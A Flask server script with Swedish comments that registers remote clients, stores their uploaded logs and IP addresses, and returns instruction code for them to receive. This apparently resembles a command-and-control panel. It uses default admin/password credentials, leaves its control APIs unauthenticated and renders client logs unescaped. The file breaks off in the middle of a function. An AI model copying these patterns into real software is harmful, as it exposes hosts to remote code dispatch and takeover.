
#!/usr/bin/python
import os
import sys
import json
import logging
import threading
import time
import shutil
import traceback
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
from flask_cors import CORS
import zipfile
from io import BytesIO

# Import instructions for clients
from instructions import INSTRUCTIONS

# Base directory setup
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIRECTORY = os.path.join(BASE_DIR, "data", "logs")
CLIENT_LOGS_DIRECTORY = os.path.join(LOG_DIRECTORY, "clients")
STATIC_DIRECTORY = os.path.join(BASE_DIR, "static")
TEMPLATES_DIRECTORY = os.path.join(BASE_DIR, "templates")
CONFIG_DIRECTORY = os.path.join(BASE_DIR, "config")
INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
ADMIN_CREDENTIALS_FILE = os.path.join(CONFIG_DIRECTORY, "admin_credentials.json")

# Constants
ONLINE_THRESHOLD_MINUTES = 5
AUTO_PING_INTERVAL = 60  # seconds

# Initialize the Flask application
app = Flask(__name__, 
            static_url_path='/static', 
            static_folder=STATIC_DIRECTORY,
            template_folder=TEMPLATES_DIRECTORY)
CORS(app)

# Session key for Flask
app.secret_key = os.urandom(24)

# Setup logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIRECTORY, "server.log")),
        logging.StreamHandler(sys.stdout)
    ]
)

# Global variables for auto-ping thread
auto_ping_thread = None
auto_ping_running = False

def get_admin_credentials():
    """Hämtar admin-inloggningsuppgifter."""
    try:
        if os.path.exists(ADMIN_CREDENTIALS_FILE):
            with open(ADMIN_CREDENTIALS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("username"), data.get("password")
        else:
            # Default credentials if no file exists
            return "admin", "password"
    except Exception as e:
        logging.error(f"Fel vid hämtning av admininloggningsuppgifter: {e}")
        return "admin", "password"  # Default if error

def set_admin_credentials(username, password):
    """Sparar nya adminuppgifter."""
    logging.debug(f"Sätter adminuppgifter för användare: {username}")
    try:
        os.makedirs(os.path.dirname(ADMIN_CREDENTIALS_FILE), exist_ok=True)
        with open(ADMIN_CREDENTIALS_FILE, "w", encoding="utf-8") as f:
            json.dump({"username": username, "password": password}, f, indent=4)
        logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare: {username}")
        return True
    except Exception as e:
        logging.error(f"Fel vid sparande av adminuppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def is_client_active(last_activity_str):
    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
    try:
        if not last_activity_str:
            return False
        
        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        return (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES)
    except Exception as e:
        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
        return False

def update_ping_status(client_id, status):
    """Uppdaterar ping-status för en klient."""
    try:
        client_index = {}
        if os.path.exists(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f)
                
        if client_id in client_index:
            client_index[client_id]["ping_status"] = status
            client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
            logging.debug(f"Uppdaterade pingstatus för klient {client_id} till {status}")
            return True
        return False
    except Exception as e:
        logging.error(f"Fel vid uppdatering av pingstatus: {e}")
        return False

def sort_log_entries(log_content, sort_order="newest"):
    """Sorterar logginlägg efter tidstämpel."""
    try:
        lines = log_content.strip().split("\n")
        sorted_lines = []

        # Analysera och sortera
        for line in lines:
            try:
                timestamp_str = line.split("[")[0].strip()
                datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                sorted_lines.append((timestamp_str, line))
            except (ValueError, IndexError):
                # Om raden inte har ett giltigt tidsstämplingsformat, lägg den längst ner
                sorted_lines.append(("0001-01-01 00:00:00", line))

        # Sortera efter tidsstämpel
        sorted_lines.sort(key=lambda x: x[0], reverse=(sort_order == "newest"))
        
        return "\n".join([line for _, line in sorted_lines])
    except Exception as e:
        logging.error(f"Fel vid sortering av logginlägg: {e}")
        # Returnera original vid fel
        return log_content

def install_static_files():
    """Installerar statiska filer om de saknas."""
    try:
        if not os.path.exists(TEMPLATES_DIRECTORY):
            os.makedirs(TEMPLATES_DIRECTORY, exist_ok=True)
            logging.info(f"Skapade mallkatalog: {TEMPLATES_DIRECTORY}")
            
        # Skapa grundläggande mallfiler om de saknas
        for template_name, template_content in {
            "login.html": """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Neea Server - Login</title>
                <link rel="stylesheet" href="/static/style.css">
            </head>
            <body>
                <div class="login-container">
                    <h1>Neea Server</h1>
                    <form method="post">
                        <div class="form-group">
                            <label for="username">Användarnamn:</label>
                            <input type="text" id="username" name="username" required>
                        </div>
                        <div class="form-group">
                            <label for="password">Lösenord:</label>
                            <input type="password" id="password" name="password" required>
                        </div>
                        {% if error %}
                        <div class="error">{{ error }}</div>
                        {% endif %}
                        <button type="submit">Logga in</button>
                    </form>
                </div>
            </body>
            </html>
            """,
            "viewer.html": """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Neea Server - Client Viewer</title>
                <link rel="stylesheet" href="/static/style.css">
                <script src="/static/script.js"></script>
            </head>
            <body>
                <div class="container">
                    <header>
                        <h1>Neea Client Viewer</h1>
                        <div class="header-actions">
                            <a href="{{ url_for('viewer') }}?logout=1" class="btn btn-logout">Logga ut</a>
                        </div>
                    </header>
                    <div class="dashboard">
                        <div class="widget">
                            <div class="widget-title">Totalt antal klienter</div>
                            <div class="widget-value">{{ total_clients }}</div>
                        </div>
                        <div class="widget">
                            <div class="widget-title">Aktiva klienter</div>
                            <div class="widget-value">{{ active_clients }}</div>
                        </div>
                        <div class="widget">
                            <div class="widget-title">Totalt antal loggar</div>
                            <div class="widget-value">{{ total_logs }}</div>
                        </div>
                        <div class="widget">
                            <div class="widget-title">Lagring använd</div>
                            <div class="widget-value">{{ storage_used }}</div>
                        </div>
                        <div class="widget">
                            <div class="widget-title">Senaste aktivitet</div>
                            <div class="widget-value">{{ latest_activity }}</div>
                        </div>
                    </div>
                    <div class="main-content">
                        <div class="sidebar">
                            <h2>Klienter</h2>
                            <div class="client-list">
                                {% for client in sorted_clients %}
                                <a href="{{ url_for('viewer') }}?client={{ client.id }}" class="client-item {% if client.id == selected_client %}active{% endif %} {% if client.is_active %}online{% else %}offline{% endif %}">
                                    <div class="client-name">{{ client.name }}</div>
                                    <div class="client-info">{{ client.os }}</div>
                                    <div class="client-status">{{ "Online" if client.is_active else "Offline" }}</div>
                                </a>
                                {% else %}
                                <div class="no-clients">Inga klienter registrerade</div>
                                {% endfor %}
                            </div>
                        </div>
                        <div class="content">
                            {% if selected_client %}
                            <div class="client-details">
                                <h2>Klientinformation</h2>
                                <div class="client-info-grid">
                                    <div class="info-item">
                                        <div class="info-label">Klient-ID</div>
                                        <div class="info-value">{{ selected_client }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">Namn</div>
                                        <div class="info-value">{{ client_info.name }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">OS</div>
                                        <div class="info-value">{{ client_info.os }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">Status</div>
                                        <div class="info-value status-{{ 'online' if client_info.is_active else 'offline' }}">
                                            {{ "Online" if client_info.is_active else "Offline" }}
                                        </div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">Senaste aktivitet</div>
                                        <div class="info-value">{{ client_info.last_activity }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">IP-adress</div>
                                        <div class="info-value">{{ client_info.ip }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">Publik IP</div>
                                        <div class="info-value">{{ client_info.public_ip }}</div>
                                    </div>
                                    <div class="info-item">
                                        <div class="info-label">Instruktion</div>
                                        <div class="info-value">{{ client_info.instruction }}</div>
                                    </div>
                                </div>

                                <div class="client-actions">
                                    <h3>Åtgärder</h3>
                                    <div class="action-buttons">
                                        <a href="#" class="btn" onclick="pingClient('{{ selected_client }}'); return false;">Ping</a>
                                        <a href="#" class="btn" onclick="clearLogs('{{ selected_client }}'); return false;">Rensa loggar</a>
                                        
                                        <form class="instruction-form">
                                            <select id="instruction-select">
                                                {% for inst_type in instruction_types %}
                                                <option value="{{ inst_type }}" {% if client_info.instruction == inst_type %}selected{% endif %}>{{ inst_type }}</option>
                                                {% endfor %}
                                            </select>
                                            <button type="button" onclick="setInstruction('{{ selected_client }}'); return false;" class="btn">Uppdatera instruktion</button>
                                        </form>
                                    </div>
                                </div>

                                <div class="log-section">
                                    <div class="log-header">
                                        <h3>Loggar</h3>
                                        <div class="log-filter">
                                            <label for="sort-order">Sortera:</label>
                                            <select id="sort-order" onchange="changeSortOrder('{{ selected_client }}', this.value)">
                                                <option value="newest" {% if sort_order == 'newest' %}selected{% endif %}>Nyast först</option>
                                                <option value="oldest" {% if sort_order == 'oldest' %}selected{% endif %}>Äldst först</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="log-viewer" id="log-content">
                                        {{ log_content|safe }}
                                    </div>
                                </div>
                            </div>
                            {% else %}
                            <div class="no-selection">
                                <h2>Ingen klient vald</h2>
                                <p>Välj en klient från listan för att visa information och loggar.</p>
                            </div>
                            {% endif %}
                        </div>
                    </div>
                </div>
            </body>
            </html>
            """
        }.items():
            template_path = os.path.join(TEMPLATES_DIRECTORY, template_name)
            if not os.path.exists(template_path):
                with open(template_path, "w", encoding="utf-8") as f:
                    f.write(template_content)
                logging.info(f"Skapade mall: {template_name}")
        
        # Skapa CSS och JS-filer om de saknas
        if not os.path.exists(STATIC_DIRECTORY):
            os.makedirs(STATIC_DIRECTORY, exist_ok=True)
            logging.info(f"Skapade statisk katalog: {STATIC_DIRECTORY}")
            
        for static_file, static_content in {
            "style.css": """
            /* Grundläggande stilar */
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f5f5f5;
                color: #333;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }
            
            header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 10px 0;
                border-bottom: 1px solid #ddd;
                margin-bottom: 20px;
            }
            
            h1, h2, h3 {
                margin-top: 0;
            }
            
            /* Login */
            .login-container {
                max-width: 400px;
                margin: 100px auto;
                padding: 20px;
                background-color: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            
            .form-group {
                margin-bottom: 15px;
            }
            
            label {
                display: block;
                margin-bottom: 5px;
            }
            
            input[type="text"],
            input[type="password"],
            select {
                width: 100%;
                padding: 8px;
                border: 1px solid #ddd;
                border-radius: 4px;
            }
            
            .error {
                color: red;
                margin: 10px 0;
            }
            
            /* Knappar */
            .btn {
                display: inline-block;
                padding: 8px 15px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                text-decoration: none;
                font-size: 14px;
            }
            
            .btn:hover {
                background-color: #45a049;
            }
            
            .btn-logout {
                background-color: #f44336;
            }
            
            .btn-logout:hover {
                background-color: #d32f2f;
            }
            
            /* Dashboard widgets */
            .dashboard {
                display: flex;
                flex-wrap: wrap;
                gap: 20px;
                margin-bottom: 20px;
            }
            
            .widget {
                flex: 1;
                min-width: 200px;
                background-color: white;
                padding: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            
            .widget-title {
                font-size: 14px;
                color: #666;
                margin-bottom: 5px;
            }
            
            .widget-value {
                font-size: 24px;
                font-weight: bold;
            }
            
            /* Huvudinnehåll */
            .main-content {
                display: flex;
                gap: 20px;
            }
            
            .sidebar {
                width: 300px;
                background-color: white;
                padding: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            
            .content {
                flex: 1;
                background-color: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            
            /* Klientlista */
            .client-list {
                max-height: 500px;
                overflow-y: auto;
            }
            
            .client-item {
                display: block;
                padding: 10px;
                margin-bottom: 5px;
                border-radius: 4px;
                text-decoration: none;
                color: #333;
                border-left: 4px solid transparent;
            }
            
            .client-item:hover {
                background-color: #f0f0f0;
            }
            
            .client-item.active {
                background-color: #e6f7ff;
                border-left-color: #1890ff;
            }
            
            .client-item.online {
                border-left-color: #52c41a;
            }
            
            .client-item.offline {
                border-left-color: #f5222d;
            }
            
            .client-name {
                font-weight: bold;
                margin-bottom: 5px;
            }
            
            .client-info {
                font-size: 12px;
                color: #666;
                margin-bottom: 5px;
            }
            
            .client-status {
                font-size: 12px;
                display: inline-block;
                padding: 2px 6px;
                border-radius: 10px;
                background-color: #f0f0f0;
            }
            
            .client-item.online .client-status {
                background-color: #f6ffed;
                color: #52c41a;
            }
            
            .client-item.offline .client-status {
                background-color: #fff1f0;
                color: #f5222d;
            }
            
            .no-clients {
                color: #999;
                padding: 20px;
                text-align: center;
            }
            
            /* Klientinformation */
            .client-info-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .info-item {
                border: 1px solid #eee;
                padding: 10px;
                border-radius: 4px;
            }
            
            .info-label {
                font-size: 12px;
                color: #666;
                margin-bottom: 5px;
            }
            
            .info-value {
                font-weight: bold;
            }
            
            .status-online {
                color: #52c41a;
            }
            
            .status-offline {
                color: #f5222d;
            }
            
            /* Loggvisare */
            .log-section {
                margin-top: 20px;
            }
            
            .log-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            
            .log-filter {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .log-viewer {
                background-color: #2c2c2c;
                color: #f0f0f0;
                padding: 15px;
                border-radius: 4px;
                font-family: monospace;
                white-space: pre-wrap;
                overflow-x: auto;
                height: 400px;
                overflow-y: auto;
            }
            
            /* Klientåtgärder */
            .client-actions {
                margin: 20px 0;
            }
            
            .action-buttons {
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
                align-items: center;
            }
            
            .instruction-form {
                display: flex;
                gap: 10px;
                align-items: center;
            }
            
            /* Ingen val-meddelande */
            .no-selection {
                text-align: center;
                padding: 50px 0;
                color: #999;
            }
            """,
            "script.js": """
            // Function to ping a client
            function pingClient(clientId) {
                if (!clientId) return;
                
                fetch(`/api/ping_client/${clientId}`, {
                    method: 'POST'
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert('Ping skickad till klienten');
                        // Uppdatera sidan för att visa den senaste pingstatus
                        window.location.reload();
                    } else {
                        alert('Fel vid ping av klienten: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Fel vid kommunikation med servern: ' + error);
                });
            }
            
            // Function to clear logs for a client
            function clearLogs(clientId) {
                if (!clientId || !confirm('Är du säker på att du vill rensa loggarna för denna klient?')) return;
                
                fetch(`/api/clear_logs/${clientId}`, {
                    method: 'POST'
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert('Loggar rensade');
                        // Uppdatera loggvisaren
                        document.getElementById('log-content').innerHTML = '<span style="color:orange">Loggarna har rensats.</span>';
                    } else {
                        alert('Fel vid rensning av loggar: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Fel vid kommunikation med servern: ' + error);
                });
            }
            
            // Function to change the sort order of logs
            function changeSortOrder(clientId, sortOrder) {
                if (!clientId) return;
                
                // Uppdatera URL med ny sorteringsordning
                const url = new URL(window.location.href);
                url.searchParams.set('sort', sortOrder);
                
                // Hämta bara logginnehåll
                fetch(`${url.pathname}?client=${clientId}&sort=${sortOrder}&partial=1`)
                .then(response => response.text())
                .then(html => {
                    document.getElementById('log-content').innerHTML = html;
                })
                .catch(error => {
                    alert('Fel vid hämtning av sorterade loggar: ' + error);
                });
            }
            
            // Function to set instruction for a client
            function setInstruction(clientId) {
                if (!clientId) return;
                
                const instruction = document.getElementById('instruction-select').value;
                
                fetch(`/api/set_instruction/${clientId}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ instruction: instruction })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(`Instruktion satt till: ${instruction}`);
                        // Uppdatera sidan för att visa den nya instruktionen
                        window.location.reload();
                    } else {
                        alert('Fel vid inställning av instruktion: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Fel vid kommunikation med servern: ' + error);
                });
            }
            
            // Initialize on page load
            document.addEventListener('DOMContentLoaded', function() {
                console.log('Viewer page loaded');
            });
            """
        }.items():
            static_path = os.path.join(STATIC_DIRECTORY, static_file)
            if not os.path.exists(static_path):
                with open(static_path, "w", encoding="utf-8") as f:
                    f.write(static_content)
                logging.info(f"Skapade statisk fil: {static_file}")
                
        logging.info("Statiska filer installerade")
    except Exception as e:
        logging.error(f"Fel vid installation av statiska filer: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")

@app.route("/api/register", methods=["POST"])
def api_register():
    """API för klientregistrering."""
    client_data = {}
    ip_address = request.remote_addr
    
    logging.debug(f"Registreringsförfrågan från {ip_address} med data: {request.get_data(as_text=True)}")
    
    try:
        if request.is_json:
            client_data = request.get_json()
        else:
            # Försök att parsa form data
            client_data = request.form.to_dict()
        
        # Verifiera nödvändig data
        if not client_data or not client_data.get("id"):
            logging.warning(f"Ogiltig registreringsförfrågan från {ip_address}: Inget ID tillhandahållet")
            return jsonify({"status": "error", "message": "Client ID krävs"}), 400
        
        client_id = client_data.get("id")
        logging.info(f"Registrerar klient {client_id} från IP {ip_address}")
        
        # Säkerställ att loggkataloger finns
        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        
        # Läs befintligt index om det finns
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            try:
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    client_index = json.load(f) or {}
            except Exception as e:
                logging.error(f"Fel vid läsning av client_index.json: {e}")
                client_index = {}
        
        # Skapa eller uppdatera klientdata
        if client_id in client_index:
            logging.info(f"Uppdaterar befintlig klient {client_id}")
            # Bevara vissa befintliga värden
            existing_data = client_index[client_id]
            # Uppdatera med ny data
            for key, value in client_data.items():
                # Uppdatera bara specifika fält, behåll annat
                if key not in ["last_activity", "first_seen"]:
                    existing_data[key] = value
            # Uppdatera aktivitetstid
            existing_data["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            existing_data["ip"] = ip_address
        else:
            logging.info(f"Skapar ny klient {client_id}")
            # Lägg till standard och infodata
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_data.update({
                "ip": ip_address,
                "first_seen": current_time,
                "last_activity": current_time,
                "instruction": client_data.get("instruction", "standard"),
                "is_active": True
            })
            client_index[client_id] = client_data
        
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.info(f"Klient {client_id} registrerad framgångsrikt")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        return jsonify({
            "status": "success", 
            "message": f"Klient {client_id} registrerad", 
            "instruction": instruction_name,
            "code": instruction_code
        })
            
    except Exception as e:
        logging.error(f"Fel vid registrering av klient: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({
            "status": "error", 
            "message": f"Registreringsfel: {str(e)}"
        }), 500

@app.route("/api/heartbeat/<client_id>", methods=["POST"])
def api_heartbeat(client_id):
    """API för klientheartbeat."""
    ip_address = request.remote_addr
    logging.debug(f"Heartbeat från klient {client_id} på IP {ip_address}")
    
    try:
        # Kontrollera om klienten finns, annars returnera fel
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        if client_id not in client_index:
            logging.warning(f"Heartbeat för okänd klient {client_id}")
            return jsonify({"status": "error", "message": "Okänd klient"}), 404
        
        # Uppdatera senaste aktivitet
        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_index[client_id]["ip"] = ip_address
        
        # Uppdatera andra fält om tillhandahållet
        additional_data = {}
        if request.is_json:
            additional_data = request.get_json()
        elif request.form:
            additional_data = request.form.to_dict()
            
        for key, value in additional_data.items():
            if key not in ["id", "last_activity", "first_seen"]:
                client_index[client_id][key] = value
                
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.debug(f"Heartbeat uppdaterad för klient {client_id}")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        return jsonify({
            "status": "success", 
            "instruction": instruction_name,
            "code": instruction_code
        })
        
    except Exception as e:
        logging.error(f"Fel vid hantering av heartbeat för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({
            "status": "error", 
            "message": f"Heartbeat-fel: {str(e)}"
        }), 500

@app.route("/api/log/<client_id>", methods=["POST"])
def api_log(client_id):
    """API för klientloggning."""
    ip_address = request.remote_addr
    logging.debug(f"Loggförfrågan från klient {client_id} på IP {ip_address}")
    
    try:
        # Kontrollera om klienten finns
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
                
        # Om klienten inte finns, registrera den
        if client_id not in client_index:
            logging.warning(f"Loggning från okänd klient {client_id}, registrerar...")
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_index[client_id] = {
                "id": client_id,
                "name": f"Unknown-{client_id[:8]}",
                "ip": ip_address,
                "first_seen": current_time,
                "last_activity": current_time,
                "instruction": "standard",
                "is_active": True,
                "os": "Unknown"
            }
        
        # Uppdatera senaste aktivitet
        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_index[client_id]["ip"] = ip_address
        
        # Säkerställ att loggkataloger finns
        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
        
        # Skriv loggdata till klientspecifik fil
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
        log_data = ""
        
        if request.is_json:
            json_data = request.get_json()
            log_data = json_data.get("data", "")
            # Uppdatera ytterligare klientinformation om tillhandahållet
            for key, value in json_data.items():
                if key not in ["data", "last_activity", "first_seen"] and value:
                    client_index[client_id][key] = value
        else:
            # Om inte JSON, försök att hämta loggdata från form eller direkt body
            log_data = request.form.get("data", request.get_data(as_text=True))
        
        # Generera tidsstämpel för logginlägget
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} [{client_id}] {log_data}\n"
        
        # Skriv loggen
        with open(client_log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.debug(f"Logg sparad för klient {client_id}")
        
        # Returnera aktuell instruktion
        instruction_name = client_index[client_id].get("instruction", "standard")
        return jsonify({
            "status": "success", 
            "instruction": instruction_name,
            "message": "Loggdata mottagen"
        })
        
    except Exception as e:
        logging.error(f"Fel vid loggning för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({
            "status": "error", 
            "message": f"Loggningsfel: {str(e)}"
        }), 500

@app.route("/api/clients", methods=["GET"])
def api_get_clients():
    """API för att hämta alla klienter."""
    logging.debug(f"Förfrågan om klientlista från {request.remote_addr}")
    
    try:
        # Läs klientindex
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Uppdatera aktivitetsstatus
        for client_id, client_info in client_index.items():
            client_info["isActive"] = is_client_active(client_info.get("last_activity", ""))
            # Konvertera till format som passar frontend
            client_info["lastSeen"] = client_info.get("last_activity", "Unknown")
            client_info["name"] = client_info.get("name", f"Unknown-{client_id[:8]}")
            client_info["os"] = client_info.get("os", "Unknown")
            client_info["system"] = client_info.get("system", "Unknown")
            client_info["publicIp"] = client_info.get("public_ip", "Unknown")
            client_info["privateIp"] = client_info.get("ip", "Unknown")
            client_info["firstSeen"] = client_info.get("first_seen", "Unknown")
            # Sätt ID i varje objekt
            client_info["id"] = client_id
        
        client_list = list(client_index.values())
        logging.debug(f"Returnerar {len(client_list)} klienter")
        
        return jsonify(client_list)
    
    except Exception as e:
        logging.error(f"Fel vid hämtning av klientlista: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify([]), 500

@app.route("/api/client/<client_id>", methods=["GET"])
def api_get_client(client_id):
    """API för att hämta en specifik klient."""
    logging.debug(f"Förfrågan om klient {client_id} från {request.remote_addr}")
    
    try:
        # Läs klientindex
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Kontrollera om klienten finns
        if client_id not in client_index:
            logging.warning(f"Förfrågan om okänd klient {client_id}")
            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
        
        client_info = client_index[client_id]
        # Uppdatera aktivitetsstatus
        client_info["isActive"] = is_client_active(client_info.get("last_activity", ""))
        # Konvertera till format som passar frontend
        client_info["lastSeen"] = client_info.get("last_activity", "Unknown")
        client_info["id"] = client_id
        
        logging.debug(f"Returnerar info om klient {client_id}")
        
        return jsonify(client_info)
    
    except Exception as e:
        logging.error(f"Fel vid hämtning av klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/ping_client/<client_id>", methods=["POST"])
def api_ping_client(client_id):
    """API för att pinga en klient."""
    logging.debug(f"Pingförfrågan för klient {client_id} från {request.remote_addr}")
    
    try:
        # Läs klientindex
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Kontrollera om klienten finns
        if client_id not in client_index:
            logging.warning(f"Försök att pinga okänd klient {client_id}")
            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
        
        # Uppdatera ping-status
        client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Skriv till loggfil att ping skickades
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} [SERVER] Ping skickad till klienten\n"
        
        with open(client_log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
        
        logging.info(f"Ping skickad till klient {client_id}")
        
        return jsonify({
            "status": "success", 
            "message": f"Ping skickad till klient {client_id}"
        })
    
    except Exception as e:
        logging.error(f"Fel vid ping av klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/clear_logs/<client_id>", methods=["POST"])
def api_clear_logs(client_id):
    """API för att rensa loggar för en klient."""
    logging.debug(f"Förfrågan om att rensa loggar för klient {client_id} från {request.remote_addr}")
    
    try:
        # Kontrollera om loggfilen finns
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
        if not os.path.exists(client_log_file):
            logging.warning(f"Försök att rensa icke-existerande loggfil för klient {client_id}")
            return jsonify({"status": "error", "message": "Inga loggar hittades för klienten"}), 404
        
        # Rensa loggar genom att öppna filen i write-mode och stänga den direkt
        with open(client_log_file, "w", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} [SERVER] Loggarna rensades av administratören\n")
        
        logging.info(f"Loggar rensade för klient {client_id}")
        
        return jsonify({
            "status": "success", 
            "message": f"Loggar rensade för klient {client_id}"
        })
    
    except Exception as e:
        logging.error(f"Fel vid rensning av loggar för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/set_instruction/<client_id>", methods=["POST"])
def api_set_instruction(client_id):
    """API för att sätta instruktion för en klient."""
    logging.debug(f"Förfrågan om att sätta instruktion för klient {client_id} från {request.remote_addr}")
    
    try:
        # Läs klientindex
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Kontrollera om klienten finns
        if client_id not in client_index:
            logging.warning(f"Försök att sätta instruktion för okänd klient {client_id}")
